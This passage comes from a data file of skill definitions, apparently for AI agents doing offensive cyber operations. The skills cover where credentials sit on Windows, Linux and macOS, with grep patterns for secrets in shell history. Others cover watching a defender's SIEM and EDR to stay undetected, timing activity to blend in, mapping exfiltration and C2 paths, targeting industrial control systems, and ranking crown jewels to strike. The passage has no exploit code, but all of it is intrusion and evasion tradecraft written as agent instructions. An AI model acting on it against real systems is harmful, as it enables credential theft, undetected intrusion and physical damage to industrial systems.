code> (DPAPI); PuTTY sessions in registry export (<code>HKCU\\Software\\SimonTatham\\PuTTY\\Sessions</code>).</li><li>Powershell history — <code>%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code>. Search <code>ConvertTo-SecureString -AsPlainText</code>, <code>-Credential</code>, connection-string patterns.</li></ul><p><strong>Linux</strong></p><ul class=\"ml\"><li><code>/etc/shadow</code> — password hashes (<code>$6$</code> SHA-512, <code>$y$</code> yescrypt on newer distros). Requires root at collection time.</li><li>SSH — <code>~/.ssh/id_*</code> (private keys; passphrase-protected if the file begins with <code>-----BEGIN OPENSSH PRIVATE KEY-----</code> and the next block includes <code>bcrypt</code>), <code>~/.ssh/authorized_keys</code> (target-side identity map, not a credential per se), <code>~/.ssh/known_hosts</code> (lateral-move targets).</li><li>GNOME Keyring — <code>~/.local/share/keyrings/*.keyring</code>; encrypted with the login password. KDE <code>kwallet</code> files under <code>~/.local/share/kwalletd/</code>.</li><li>Shell history — <code>~/.bash_history</code>, <code>~/.zsh_history</code>, <code>~/.psql_history</code>, <code>~/.mysql_history</code>, <code>~/.python_history</code>. Search for <code>curl -u</code>, <code>git clone https://.*:.*@</code>, <code>export ..._TOKEN=</code>, <code>mysql -p...</code>.</li><li>App config — <code>~/.aws/credentials</code>, <code>~/.config/gcloud/</code>, <code>~/.kube/config</code> (client certs and bearer tokens), <code>~/.docker/config.json</code> (base64 basic-auth), <code>~/.netrc</code>.</li><li>Systemd credentials cache — <code>/etc/credstore/</code>, <code>/etc/credstore.encrypted/</code>.</li></ul><p><strong>macOS</strong></p><ul class=\"ml\"><li>Keychain — <code>~/Library/Keychains/login.keychain-db</code> (user) and <code>/Library/Keychains/System.keychain</code> (system). Encrypted with the user's login password (or the system key stored under SIP). Offline extraction: <code>chainbreaker</code> against a collected keychain file + known password.</li><li>iCloud Keychain sync data — <code>~/Library/Application Support/com.apple.sbd/</code>; requires SEP-derived key material, generally not extractable from a plain disk image.</li><li>SSH agent — no on-disk state; capture is memory-only via <code>disk-memory-forensics</code>.</li><li>Shell history + app config as Linux.</li><li>Chrome/Safari saved passwords — protected by keychain; requires keychain extraction first.</li></ul><p><strong>Cross-cutting</strong></p><ul class=\"ml\"><li>OS-store credentials classify by user scope (<code>scope: account</code> or <code>host</code>), except LSA/machine-account material which is <code>scope: host</code>+ (can pivot to domain via silver-ticket-style analysis — flag for <code>identity-directory-trust</code>). Reporting via <a href=\"../credential-harvest-triage/SKILL.md\" target=\"_blank\" rel=\"noopener\"><code>credential-harvest-triage</code></a>; source cites path within the collected image, redacting the analyst's own home directory.</li></ul>","n":3632}],"m":{"name":17,"desc":367,"body":6061,"file":6666,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":35.8},"name":{"lim":64,"pct":26.6}}}},"ot-embedded":{"slug":"ot-embedded","pillar":"analysts","name":"ot-embedded","description":"Analyse an industrial or embedded target on its own terms — controllers and buses, proprietary protocols such as Modbus, DNP3, S7 and EtherNet/IP, carved firmware and ladder logic, historian data — where downtime is physical and fragility is the constraint, when the target crosses out of IT into ICS, SCADA, building, medical, automotive or bespoke hardware.","family":"target-modelling","ported":false,"source":"docs/roles/operational-analyst.md#L108","summary":"Analyse operational-technology and embedded environments — ICS/SCADA, PLCs, controllers, and firmware — on their own terms. This is a cross-cutting deep skill that attaches to whichever analytic leg (targeting, mapping, effects, verification) the operation puts against an OT/embedded target.","file":"acordia-analysts/skills/ot-embedded/SKILL.md","used_by":[],"intro":"<p># Operational-Technology / Embedded</p>","secs":[{"t":"Objective","h":"<p>Analyse operational-technology and embedded environments — ICS/SCADA, PLCs, controllers, and firmware — on their own terms. This is a cross-cutting deep skill that attaches to whichever analytic leg (targeting, mapping, effects, verification) the operation puts against an OT/embedded target.</p>","n":292},{"t":"When to use","h":"<ul class=\"ml\"><li>When the target crosses from IT into OT/embedded: industrial control, building systems, medical, automotive, or bespoke hardware.</li><li>When IT assumptions break — where downtime is physical, protocols are proprietary, and a wrong move has kinetic consequences.</li></ul>","n":259},{"t":"Method","h":"<ul class=\"ml\"><li>Inventory the collected OT evidence first with <code>ls</code>/<code>find</code>/<code>glob</code> and a file-typing pass — firmware images, HMI project files, ladder-logic exports, historian dumps, PCAPs of industrial protocols — recording device, vendor, and firmware version per artefact before any read.</li><li>Learn the specific environment: identify controllers, buses, and industrial protocols (Modbus, DNP3, S7, EtherNet/IP) and how the process actually maps to the equipment.</li><li>Analyse firmware and embedded logic with bounded reads over exhaustive coverage: carve and enumerate the image with <code>binwalk</code>/<code>strings</code> across 100% of its bytes, then read only the located regions (offsets, function bounds) into context rather than loading a multi-megabyte image; reason about memory and I/O without the safety net of a normal OS.</li><li>Respect the physics: model the process the OT controls, so effects and side-effects are understood before, not after, they manifest in the real world.</li><li>Read OT-specific engineering artefacts (HMI projects, ladder logic, historian data) for state, intent, and safety interlocks, processing every located hit rather than the first, and cite each finding as <code>&lt;artefact&gt;:&lt;offset&gt;</code> for binary evidence or <code>&lt;artefact&gt;@L&lt;line&gt;</code> for text/project exports.</li><li>Weight fragility and consequence heavily — legacy, unpatched, safety-critical systems fail hard, and detection and damage both differ from IT.</li><li>Degradation: if a firmware image is encrypted or a proprietary project format has no available parser, fall back to protocol capture and observable process behaviour and flag the reduced confidence; if a vendor's format is entirely opaque with no tool to read it, flag the gap and stop rather than guessing.</li></ul>","n":1703},{"t":"Signals / outputs","h":"<ul class=\"ml\"><li>A model of the OT/embedded target: devices, protocols, process, and controlling logic.</li><li>Firmware/embedded behaviour analysis with I/O and memory understanding.</li><li>Consequence and safety assessment tying any action to its physical effect.</li></ul>","n":239}],"m":{"name":11,"desc":359,"body":2596,"file":3178,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":35.1},"name":{"lim":64,"pct":17.2}}}},"outcome-judgement":{"slug":"outcome-judgement","pillar":"analysts","name":"outcome-judgement","description":"Call whether an action achieved the operation's intended end — the effect took hold on the target, or the intelligence was genuinely collected — by inventorying first-party against independent observable channels and separating 'the payload ran' from 'the system actually changed', immediately after any action whose success indicators are ambiguous, delayed or spoofable.","family":"analytic-spine","ported":false,"source":"docs/roles/operational-analyst.md#L74","summary":"After an action, judge whether the operation's intended end was actually achieved — the effect (break / deny / manipulate) took hold, or the intelligence was genuinely collected — and decide what happens next. This includes verifying that the target system genuinely changed in the intended way, separating \"the payload ran\" from \"the effect occurred,\" and both from what the target may be showing you deliberately.","file":"acordia-analysts/skills/outcome-judgement/SKILL.md","used_by":[],"intro":"<p># Outcome Judgement (End Achieved)</p>","secs":[{"t":"Objective","h":"<p>After an action, judge whether the operation's intended end was actually achieved — the effect (break / deny / manipulate) took hold, or the intelligence was genuinely collected — and decide what happens next. This includes verifying that the target system genuinely changed in the intended way, separating &quot;the payload ran&quot; from &quot;the effect occurred,&quot; and both from what the target may be showing you deliberately.</p>","n":415},{"t":"When to use","h":"<ul class=\"ml\"><li>An action has fired and you must call success or failure against the objective.</li><li>The technique &quot;worked&quot; but it is unclear whether it produced the intended operational end.</li><li>Immediately after any action intended to produce an effect (access gained, service disrupted, data altered, persistence set), especially when success indicators are ambiguous, delayed, or could be spoofed by the defender.</li></ul>","n":398},{"t":"Method","h":"<ul class=\"ml\"><li>Restate the intended end in observable terms before acting: what state must be true on the target if it worked. Judge against that — not against &quot;did the tool run&quot;.</li><li><strong>Inventory the observable channels before reading them</strong> — command return, target-side logs, downstream service signals, out-of-band indicators — and record which are <strong>first-party</strong> (the tool's own report) and which are <strong>independent</strong>, because the split decides how much each is worth. Never rest a verdict on the tool's own success return alone.</li><li>Gather independent observables with bounded, exhaustive reads: scope each source to the action's time window, but process every matching record in that window rather than the first hit, so a delayed or buffered effect is not missed.</li><li><strong>Distinguish delivery from effect from persistence</strong>: code executed vs objective achieved vs objective held under the target's response and not silently reverted or contained. Cite each supporting observable as <code>&lt;log&gt;:&lt;offset&gt;</code> or <code>&lt;log&gt;@L&lt;line&gt;</code>, capturing any transient downstream or out-of-band signal to a file first so the verdict stays auditable back to evidence.</li><li>For collection specifically: confirm the data is genuine, complete enough, and not planted or partial (see <code>deception-detection</code>).</li><li><strong>Watch for deception and honeypot tells</strong> — effects that are too clean, mirrored responses, or verification channels the defender controls; treat a channel the defender may control as untrusted and flag the gap.</li><li>Weigh cost paid: what the action cost in exposure, access, or attribution, and whether that changes the win.</li><li>Classify: end achieved / partial / failed / unknown-pending-confirmation, and derive the next move — exploit, re-attempt, collect more, or withdraw.</li><li><strong>Degradation</strong>: if only the first-party return is available and no independent channel can be read, cap the verdict at &quot;delivered, effect unconfirmed&quot; and say so rather than reporting success.</li></ul>","n":1932},{"t":"Signals / outputs","h":"<ul class=\"ml\"><li>A verdict on whether the operational end was met, with the confirming independent observation, and the explicit separation of delivery vs effect vs persistence.</li><li>The residual cost/exposure the action incurred, and a deception-risk note.</li><li>A next-move recommendation: exploit, re-attack, collect more, or disengage.</li></ul>","n":317}],"m":{"name":17,"desc":372,"body":3164,"file":3772,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":36.3},"name":{"lim":64,"pct":26.6}}}},"overwatch":{"slug":"overwatch","pillar":"analysts","name":"overwatch","description":"Hold a live read on whether the defender has noticed, by working your reach into their own security operations — SIEM and EDR consoles, alert queues, SOAR tickets, analyst chat, mailboxes — alongside external tells such as credential invalidation, blocked C2, sinkholed domains and fresh agent pushes, and convert it into a timely go-quiet, move or pull-out call.","family":"defender-reading","ported":false,"source":"docs/roles/operational-analyst.md#L95","summary":"Maintain a live read on whether the defender has detected the operation by fusing data pulled from their own security operations with external signals, and convert that read into a timely go-quiet / move / pull-out call.","file":"acordia-analysts/skills/overwatch/SKILL.md","used_by":[],"intro":"<p># Overwatch (Live &quot;Are We Detected?&quot;)</p>","secs":[{"t":"Objective","h":"<p>Maintain a live read on whether the defender has detected the operation by fusing data pulled from their own security operations with external signals, and convert that read into a timely go-quiet / move / pull-out call.</p>","n":220},{"t":"When to use","h":"<ul class=\"ml\"><li>Continuously throughout an active engagement, especially after any action flagged as detectable.</li><li>The moment any anomaly on the blue side or in your own channels suggests attention.</li></ul>","n":184},{"t":"Method","h":"<ul class=\"ml\"><li>Inventory your reach into the defender's surfaces first — which SIEM/EDR consoles, alert queues, ticketing/SOAR boards, analyst chat channels, and mailboxes you can actually see — and export what you rely on to files, enumerating those captures with <code>ls</code>/<code>glob</code> so coverage is known rather than assumed.</li><li>Collect from inside with bounded, exhaustive queries: scope each console read to a time window or a rule/host filter rather than scrolling the whole feed, but process every alert and ticket that window returns, not just the first screenful — a missed alert in the tail is the one that ends the operation.</li><li>Fuse with external signals: sudden credential/token invalidation, blocked C2, sinkholed domains, new EDR pushes, threat-intel or vendor chatter, staff behavior changes.</li><li>Correlate blue activity to your own timeline — did an alert or investigation follow a specific action of yours? — to gauge whether they are onto the operation vs. routine noise, and cite each corroborating observation against its capture as <code>&lt;export&gt;:&lt;alert-id&gt;</code> or <code>&lt;export&gt;@L&lt;line&gt;</code>, so a live view that has since scrolled away stays reproducible evidence.</li><li>Track dwell indicators: is the response widening, targeting your artifacts, or preparing containment (isolation, resets, forensics collection).</li><li>Produce a standing detection-likelihood estimate and a trigger threshold for each response option; never let the estimate go stale.</li><li>Degradation: if a console or queue is unreachable, fall back to the external signals and say plainly which internal source is dark and how much that widens the uncertainty; if you have no blue-side visibility at all, flag the blind spot rather than reporting a false all-clear.</li></ul>","n":1704},{"t":"Signals / outputs","h":"<ul class=\"ml\"><li>A live detection-likelihood read with the evidence behind it and its confidence.</li><li>A recommended posture — continue / go quiet / relocate infrastructure / exit — with the trigger that would change it.</li><li>Early-warning indicators queued for continuous monitoring and handoff.</li></ul>","n":275}],"m":{"name":9,"desc":363,"body":2488,"file":3066,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":35.4},"name":{"lim":64,"pct":14.1}}}},"own-footprint-analysis":{"slug":"own-footprint-analysis","pillar":"analysts","name":"own-footprint-analysis","description":"Enumerate and ledger every indicator the operation itself emits, layer by layer — dropped files, registry, services, prefetch and host logs; C2 domains, TLS certificates and User-Agents; created accounts and tokens; redirector and VPS records — so you know exactly what a responder could recover and attribute before you go quiet, hand off or exit.","family":"defender-reading","ported":false,"source":"docs/roles/operational-analyst.md#L94","summary":"Systematically enumerate the indicators the operation itself generates across every layer, producing the attacker's-eye inventory of \"what we leave behind\" that feeds evasion, Overwatch, and cleanup decisions.","file":"acordia-analysts/skills/own-footprint-analysis/SKILL.md","used_by":[],"intro":"<p># Own-Footprint / Emitted-Indicator Analysis</p>","secs":[{"t":"Objective","h":"<p>Systematically enumerate the indicators the operation itself generates across every layer, producing the attacker's-eye inventory of &quot;what we leave behind&quot; that feeds evasion, Overwatch, and cleanup decisions.</p>","n":209},{"t":"When to use","h":"<ul class=\"ml\"><li>Before, during, and after any phase, to keep a running ledger of emitted indicators.</li><li>When preparing to go quiet, hand off, or exit, and you need to know what remains for a responder to find.</li></ul>","n":194},{"t":"Method","h":"<ul class=\"ml\"><li>Inventory the operation's own emitted-artefact set with <code>glob</code> / <code>find</code> / <code>list</code>: staging logs, C2 configs, tooling manifests, redirector/VPS records, and any collection our own dry-runs produced.</li><li>Read in bounded, context-scoped slices — a single log day, a single host's exported registry hive, a single beacon PCAP window — rather than dumping the entire operation's ledger into context at once; drive coverage with an exhaustive <code>grep</code>/parser pass over the whole source to isolate every indicator, then read the scoped line range around each — every hit, not just the first.</li><li>Walk each layer and list artifacts: host (files, registry, services, prefetch, logs), network (C2 domains/IPs, JA3/JARM, TLS certs, User-Agents), identity (accounts, tokens, consent), and infrastructure (redirectors, VPS, registrant/OSINT leakage).</li><li>For each indicator, record its fidelity (how uniquely it points to us), persistence (how long it survives), and observability (who can see it); cite each ledger entry by <code>&lt;path&gt;:&lt;offset&gt;</code> (byte) or <code>&lt;path&gt;@L&lt;line&gt;</code> (line) back to the source artefact so the ledger stays auditable.</li><li>Distinguish transient indicators (in-memory, session-scoped) from durable ones (on-disk, logged, registered) and flag the durable, high-fidelity ones as priority risk.</li><li>Cross-check against the defender's known collection to see which emitted indicators are actually within their reach.</li><li>Maintain the ledger as a living artifact; update it every time a new tool, host, or channel is introduced.</li><li>If a specialised triage helper (e.g. <code>KAPE</code>-style timelining, JA3/JARM extractor, prefetch parser) is unavailable, fall back to manual <code>grep</code>-driven reads of the raw exports; if the operational logs themselves were never collected, flag the gap and mark the ledger incomplete rather than infer emissions from memory.</li></ul>","n":1832},{"t":"Signals / outputs","h":"<ul class=\"ml\"><li>A layered indicator ledger with fidelity/persistence/observability per item.</li><li>A prioritized list of durable, attributable artifacts requiring cleanup or avoidance.</li><li>Inputs for Overwatch (what to watch for on the blue side) and for exit/cleanup planning.</li></ul>","n":257}],"m":{"name":22,"desc":348,"body":2604,"file":3189,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":34.0},"name":{"lim":64,"pct":34.4}}}},"packet-traffic-analysis":{"slug":"packet-traffic-analysis","pillar":"analysts","name":"packet-traffic-analysis","description":"Read the wire from a capture or flow export, building the conversation graph from Zeek connection aggregates and fingerprinting live hosts, services and stacks from real banners, TLS, DNS, SMB and Kerberos traffic instead of active probing, to get ground truth on reachability, trust and blend-in paths that scanning would miss or be far too noisy to probe.","family":"evidence-forensics","ported":false,"source":"docs/roles/operational-analyst.md#L82","summary":"Turn captured packets or flow records into an operational picture of the target: who talks to whom, over what, when, and where the exploitable gaps and blend-in paths are.","file":"acordia-analysts/skills/packet-traffic-analysis/SKILL.md","used_by":[],"intro":"<p># Packet &amp; Traffic Analysis</p>","secs":[{"t":"Objective","h":"<p>Turn captured packets or flow records into an operational picture of the target: who talks to whom, over what, when, and where the exploitable gaps and blend-in paths are.</p>","n":171},{"t":"When to use","h":"<ul class=\"ml\"><li>When you have a capture (pcap/pcapng) or flow data (NetFlow/IPFIX/sFlow) from inside or adjacent to the target.</li><li>When you need ground-truth on live hosts, services, and trust that scanning would miss or that would be too noisy to probe.</li></ul>","n":239},{"t":"Method","h":"<ul class=\"ml\"><li>Inventory the capture set with <code>ls</code> / <code>find</code> / <code>glob</code> (pcap/pcapng files, netflow/IPFIX/sFlow exports); note per-file capture point, timespan, byte size, and truncation (<code>capinfos</code>) before opening anything.</li><li>Read bounded slices — never load a multi-gigabyte pcap wholesale. Drive with <code>tshark -Y &lt;bpf-or-display-filter&gt;</code> per conversation, <code>zeek -r</code> for typed logs (<code>conn.log</code>, <code>dns.log</code>, <code>http.log</code>, <code>ssl.log</code>, <code>kerberos.log</code>, <code>smb_files.log</code>), and <code>mergecap</code>/<code>editcap</code> slices when scoping to a time window. Map the conversation graph from Zeek <code>conn.log</code> aggregates rather than per-packet reads.</li><li>Fingerprint services and stacks from real traffic (banners, TLS/JA3, DNS, SMB/Kerberos, DHCP) rather than active probing, extracting via the Zeek log field of interest or a scoped <code>tshark -T fields</code> query.</li><li>Extract credentials, tokens, and cleartext where protocols leak them; note where auth and encryption are weak or absent. Never quote raw credential values — cite location only.</li><li>Read behaviour and timing — beacon-like periodicity, backup/replication flows, admin sessions, trust and dependency edges — from flow aggregates.</li><li>Locate opportunity: unsegmented paths, chatty services, exfil-friendly channels, and where your traffic would look native. Cite each finding as <code>&lt;pcap&gt;:&lt;packet-number&gt;</code> (or <code>&lt;pcap&gt;:&lt;frame-offset&gt;</code>) for packet-level evidence and <code>&lt;log&gt;@L&lt;line&gt;</code> for Zeek/flow log lines.</li><li>Degradation: if <code>tshark</code>/Wireshark is unavailable, fall back to Zeek logs alone (or <code>tcpdump -r ... -nn</code>) and flag reduced protocol-decoder coverage; if Zeek is unavailable, fall back to <code>tshark -T fields</code> extraction and flag missing typed-log fidelity; if only netflow is on hand (no payload), flag the gap for any signature that requires payload inspection.</li></ul>","n":1767},{"t":"Signals / outputs","h":"<ul class=\"ml\"><li>Host/service inventory and conversation graph derived from real traffic.</li><li>Extracted secrets, weak-auth findings, and trust edges.</li><li>Candidate movement paths and covert channels with timing to blend into.</li></ul>","n":206}],"m":{"name":23,"desc":357,"body":2478,"file":3087,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":34.9},"name":{"lim":64,"pct":35.9}}}},"pattern-of-life-baselining":{"slug":"pattern-of-life-baselining","pillar":"analysts","name":"pattern-of-life-baselining","description":"Baseline the target's normal rhythms from authentication, endpoint-telemetry and calendar sources — working hours and timezone, admin windows, backup, patch and batch jobs, idle periods — so activity can be timed into the routine and genuine deviations such as an admin logon, a new tool or a hunt in progress stand out on demand.","family":"target-modelling","ported":false,"source":"docs/roles/operational-analyst.md#L80","summary":"Establish the target's baseline behaviour across people and machines so operational activity can be timed to blend in, and so deviations (yours or the defender's) stand out on demand.","file":"acordia-analysts/skills/pattern-of-life-baselining/SKILL.md","used_by":[],"intro":"<p># Pattern-of-Life / Behavioural Baselining</p>","secs":[{"t":"Objective","h":"<p>Establish the target's baseline behaviour across people and machines so operational activity can be timed to blend in, and so deviations (yours or the defender's) stand out on demand.</p>","n":183},{"t":"When to use","h":"<ul class=\"ml\"><li>Before acting inside a target, to schedule activity into normal rhythm and avoid tripping behavioural detection.</li><li>When you need to distinguish routine noise from meaningful change (admin logon, a new tool, a hunt in progress).</li></ul>","n":229},{"t":"Method","h":"<ul class=\"ml\"><li>Inventory the temporal data sources with <code>glob</code> / <code>find</code> / <code>list</code>: authentication logs, EDR process telemetry, mail/calendar exports, scheduled-task dumps, and any prior baseline artefacts.</li><li>Read in bounded, context-scoped slices per source — one week of logon events, one admin's process tree, one service account's scheduled runs — rather than ingesting months of raw log into context wholesale; drive coverage with an exhaustive <code>grep</code>/parser pass over the whole source to isolate every actor or time window in scope, then read the scoped line range around each — every hit, not just the first.</li><li>Collect temporal data: logon times, working hours, timezone, admin windows, backup/patch jobs, batch runs, beacon-friendly idle periods.</li><li>Profile per-actor patterns — a given admin's hosts, tools, and cadence; a service account's fixed behaviour; a system's periodic traffic; cite each pattern claim by <code>&lt;path&gt;:&lt;offset&gt;</code> (byte) or <code>&lt;path&gt;@L&lt;line&gt;</code> (line) back to the log line that supports it.</li><li>Separate human rhythm from automation rhythm; automation is regular and forgeable, humans are irregular and observant.</li><li>Derive blend-in windows and cover: when your action looks like theirs, and which identity/host makes it plausible.</li><li>Re-baseline periodically — normal drifts, and a stale baseline turns your cover into an anomaly.</li><li>If a log-parsing helper (e.g. <code>evtx_dump</code>, <code>chainsaw</code>, a SIEM export tool) is unavailable, fall back to raw <code>grep</code> over the collected exports; if the collection itself is missing the relevant time window, flag the gap and mark the baseline partial rather than extrapolate.</li></ul>","n":1609},{"t":"Signals / outputs","h":"<ul class=\"ml\"><li>Baseline profiles per user/admin/system with active hours and typical actions.</li><li>Quiet windows and high-cover windows for operational timing.</li><li>Anomaly triggers that flag defender activity or environment change.</li></ul>","n":213}],"m":{"name":26,"desc":330,"body":2344,"file":2925,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":32.2},"name":{"lim":64,"pct":40.6}}}},"protocol-routing-architecture":{"slug":"protocol-routing-architecture","pillar":"analysts","name":"protocol-routing-architecture","description":"Reconstruct the target network's shape from device configs, routing tables, firewall rulesets and VPN definitions — L2 and L3 topology, VLANs and subnets, routing domains, tunnels, trust zones, chokepoints and egress paths — to establish what can reach what before planning movement or touching a control that divides two segments.","family":"target-modelling","ported":false,"source":"docs/roles/operational-analyst.md#L83","summary":"Reconstruct the target's network architecture — topology, routing, segmentation, and protocol boundaries — to reveal reachable paths, trust zones, and the controls that stand between access and objective.","file":"acordia-analysts/skills/protocol-routing-architecture/SKILL.md","used_by":[],"intro":"<p># Protocol, Routing &amp; Network Architecture</p>","secs":[{"t":"Objective","h":"<p>Reconstruct the target's network architecture — topology, routing, segmentation, and protocol boundaries — to reveal reachable paths, trust zones, and the controls that stand between access and objective.</p>","n":204},{"t":"When to use","h":"<ul class=\"ml\"><li>When planning movement across a network and needing to know what can reach what.</li><li>When you must locate segmentation, chokepoints, and egress/ingress paths before touching them.</li></ul>","n":179},{"t":"Method","h":"<ul class=\"ml\"><li>Inventory the collected network artefacts with <code>glob</code> / <code>find</code> / <code>list</code>: config exports (Cisco/Juniper/Palo Alto), routing tables, firewall rulesets, VPN configs, network diagrams, and any topology dumps.</li><li>Read in bounded, context-scoped slices by interface block, VLAN definition, or ACL rule set rather than pulling multi-megabyte show-tech dumps wholesale into context; drive coverage with an exhaustive <code>grep</code>/parser pass over the whole export to locate every segment boundary, then read the scoped line range around each hit — every hit, not just the first.</li><li>Map layers from those reads: L2/L3 topology, VLANs, subnets, routing domains, VPNs/tunnels, and the gateways/firewalls that join or divide them.</li><li>Identify segmentation and trust zones — DMZ, corp, OT/ICS, management, cloud interconnect — and the exact crossing points; cite each boundary by <code>&lt;path&gt;:&lt;offset&gt;</code> (byte) or <code>&lt;path&gt;@L&lt;line&gt;</code> (line) back to the config line that proves the claim.</li><li>Trace routing and reachability: default routes, NAT, proxies, split-tunnel, and what a packet from your foothold can actually reach.</li><li>Profile protocols in play (routing protocols, tunneling, management planes) and their weaknesses or misconfigurations.</li><li>Derive attack paths: which segment boundary to cross, via which host/rule/protocol, and where egress for C2 or exfil exists.</li><li>If a vendor-specific parser (e.g. <code>ciscoconfparse</code>, offline <code>netmiko</code> helpers) is unavailable, fall back to manual <code>grep</code>-driven reads of the raw config; if the raw config itself is missing, flag the gap and stop rather than infer topology from screenshots or memory.</li></ul>","n":1611},{"t":"Signals / outputs","h":"<ul class=\"ml\"><li>Segmentation and trust-zone map with named crossing points.</li><li>Reachability matrix from likely footholds to objectives.</li><li>Ingress/egress and C2 path candidates, with the controls on each.</li></ul>","n":188}],"m":{"name":29,"desc":331,"body":2292,"file":2879,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":32.3},"name":{"lim":64,"pct":45.3}}}},"reasoning-under-uncertainty":{"slug":"reasoning-under-uncertainty","pillar":"analysts","name":"reasoning-under-uncertainty","description":"Reach a defensible provisional judgement when the picture is too thin or too noisy to read cleanly, fixing the decision and its deadline first, triaging knowns from unknowables, reasoning from the target's structure and incentives under scarcity and filtering by decision-relevance under overload, so the operation moves with explicit reconsider triggers.","family":"analytic-spine","ported":false,"source":"docs/roles/operational-analyst.md#L67","summary":"Produce a defensible operational judgement when information is scarce, contradictory, or overwhelming, so the operation keeps moving instead of stalling on a picture that will never be complete.","file":"acordia-analysts/skills/reasoning-under-uncertainty/SKILL.md","used_by":[],"intro":"<p># Reasoning Under Uncertainty &amp; Overload</p>","secs":[{"t":"Objective","h":"<p>Produce a defensible operational judgement when information is scarce, contradictory, or overwhelming, so the operation keeps moving instead of stalling on a picture that will never be complete.</p>","n":194},{"t":"When to use","h":"<ul class=\"ml\"><li>You are starved of data on a target and pressured to decide anyway (move / hold / abort).</li><li>You are drowning in collection and cannot see which signals actually bear on the decision.</li></ul>","n":184},{"t":"Method","h":"<ul class=\"ml\"><li>Fix the decision first, not the data: state the exact call you owe and the deadline, then reason backward to only the facts that would change it.</li><li>Triage the picture into knowns, unknowns, and unknowables; refuse to spend effort resolving what is unknowable in the available window.</li><li>Under scarcity, reason from the target's structure and incentives (what a system/operator of this type must do) to bridge missing observations.</li><li>Under overload, filter by decision-relevance and source diversity; discount volume, weight independent corroboration.</li><li>Decide provisionally, mark the judgement as revisable, and set the trigger that would force reconsideration.</li></ul>","n":662},{"t":"Signals / outputs","h":"<ul class=\"ml\"><li>A stated operational judgement with the minimum evidence it rests on.</li><li>A short list of what would flip the call (the reconsider triggers).</li><li>A confidence band and an explicit note of what remains unknown or unknowable.</li></ul>","n":221}],"m":{"name":27,"desc":355,"body":1369,"file":1970,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":34.7},"name":{"lim":64,"pct":42.2}}}},"target-mission-analysis":{"slug":"target-mission-analysis","pillar":"analysts","name":"target-mission-analysis","description":"Reverse-engineer what the target organisation exists to produce, trace its mission threads end to end through the systems, data, people and third parties that must all work, and rank the crown jewels and single points of dependence it cannot afford to lose, when a broad target must become a short list of objectives with a defensible so-what.","family":"target-modelling","ported":false,"source":"docs/roles/operational-analyst.md#L79","summary":"Produce a ranked model of the target's crown jewels and mission threads: what the organization is FOR, the end-to-end processes that deliver it, and the assets/dependencies those processes cannot function without.","file":"acordia-analysts/skills/target-mission-analysis/SKILL.md","used_by":[],"intro":"<p># Target Business/Mission Analysis</p>","secs":[{"t":"Objective","h":"<p>Produce a ranked model of the target's crown jewels and mission threads: what the organization is FOR, the end-to-end processes that deliver it, and the assets/dependencies those processes cannot function without.</p>","n":213},{"t":"When to use","h":"<ul class=\"ml\"><li>Early in an operation to convert a broad target into a short list of high-value objectives.</li><li>When an access decision needs a &quot;so what&quot; — is this system a means to mission effect or just noise.</li></ul>","n":195},{"t":"Method","h":"<ul class=\"ml\"><li>State the mission in one line: what value the target produces and for whom (revenue line, service, command function, supply obligation).</li><li>Trace the mission thread end-to-end — the process, systems, data, people, and third parties that must all work for output to happen.</li><li>Identify choke points and single points of dependence: the system whose loss stops or corrupts the thread.</li><li>Map crown jewels: the data, keys, code, or relationships whose compromise yields disproportionate leverage.</li><li>Rank objectives by mission impact x accessibility, not by technical shininess.</li></ul>","n":573},{"t":"Signals / outputs","h":"<ul class=\"ml\"><li>Crown-jewel register tied to concrete systems/data stores and owners.</li><li>Mission-thread diagram with named choke points and dependencies.</li><li>Prioritized objective list mapping &quot;hit/hold this&quot; to &quot;this mission effect.&quot;</li></ul>","n":217}],"m":{"name":23,"desc":343,"body":1300,"file":1888,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":33.5},"name":{"lim":64,"pct":35.9}}}},"vuln-attacksurface-mapping":{"slug":"vuln-attacksurface-mapping","pillar":"analysts","name":"vuln-attacksurface-mapping","description":"Consolidate every recon feed — external and internal scan output, cloud-asset inventories, identity enumeration, application and API catalogues, human-surface OSINT — into one ranked attack surface ordered by exploitability times proximity to the crown jewels rather than by CVSS, when terrain and mission analysis must converge on where to strike first.","family":"target-modelling","ported":false,"source":"docs/roles/operational-analyst.md#L88","summary":"Build and prioritize the target's attack surface — every reachable entry point and its weaknesses — ranked not by CVSS but by exploitability times proximity to the crown jewels.","file":"acordia-analysts/skills/vuln-attacksurface-mapping/SKILL.md","used_by":[],"intro":"<p># Vulnerability &amp; Attack-Surface Mapping</p>","secs":[{"t":"Objective","h":"<p>Build and prioritize the target's attack surface — every reachable entry point and its weaknesses — ranked not by CVSS but by exploitability times proximity to the crown jewels.</p>","n":177},{"t":"When to use","h":"<ul class=\"ml\"><li>When terrain and mission analysis must converge into a decision on where to strike first.</li><li>When there are more findings than time, and prioritization must reflect mission value.</li></ul>","n":180},{"t":"Method","h":"<ul class=\"ml\"><li>Inventory the reachable recon feeds with <code>glob</code> / <code>find</code> / <code>list</code>: external scan outputs, internal Nmap results, cloud-asset inventories, identity enumeration dumps, application/API catalogues, and human-surface OSINT.</li><li>Read in bounded, context-scoped slices per source — one scanner report, one cloud-asset export, one identity slice — rather than concatenating every feed into a single wall of text in context; drive coverage with an exhaustive <code>grep</code>/parser pass over the whole feed to locate every candidate finding, then read the scoped range around each — every hit, not just the first.</li><li>Aggregate the surface: external and internal exposure, services, apps/APIs, cloud, identity, and human entry points from all recon feeds.</li><li>Assess each element for weakness — known vulns, misconfig, weak auth, exposure — and, critically, whether it is actually reachable and exploitable; cite each weakness by <code>&lt;path&gt;:&lt;offset&gt;</code> (byte) or <code>&lt;path&gt;@L&lt;line&gt;</code> (line) back to the scan or config line that grounds it.</li><li>Weight by mission proximity: how close a foothold there sits to a crown jewel or mission choke point.</li><li>Rank by exploitability x impact x cost/risk to use; prefer reliable, quiet paths over flashy ones.</li><li>Keep it live 